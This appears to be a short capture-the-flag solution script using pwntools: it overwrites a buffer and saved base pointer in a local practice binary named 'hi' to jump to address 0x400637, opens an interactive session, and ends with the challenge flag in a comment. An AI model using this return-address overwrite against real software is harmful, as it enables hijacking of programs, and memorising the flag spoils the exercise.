from pwn import *

print(p64(0x0000000000400637))
inp = b"A"*32 + b"X"*8 + bytes([0x37, 0x06, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00])
print(inp)

with process("hi") as p:
    p.recvuntil(": ")
    p.sendline(inp)
    p.interactive()

#ccit{hi_i_am_a_flag}